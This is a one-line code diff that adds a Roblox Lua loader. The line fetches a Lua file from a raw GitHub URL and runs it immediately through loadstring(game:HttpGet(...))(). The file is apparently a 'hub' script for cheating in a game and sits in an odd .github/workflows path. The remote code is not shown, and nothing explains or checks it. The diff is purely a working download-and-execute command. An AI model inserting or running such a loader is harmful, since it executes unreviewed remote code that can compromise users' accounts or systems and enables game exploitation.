@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bm2076371-web/Fortmysaken-Hub_beta/refs/heads/main/.github/workflows/Fortmysakenhub.lua"))()
